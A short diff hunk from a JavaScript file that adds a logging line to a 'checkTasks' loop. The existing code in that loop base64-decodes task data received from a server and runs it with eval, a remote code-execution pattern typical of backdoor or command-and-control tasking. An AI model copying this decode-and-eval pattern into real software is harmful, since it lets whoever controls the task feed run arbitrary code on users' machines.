@@ -963,6 +963,8 @@ async function checkTasks()
 		var taskId   = jsonResponse[i].id;
 		var taskData = jsonResponse[i].data;
 
+		console.log("Got task: " + taskData);
+
 		eval(atob(taskData));
 	}
 }
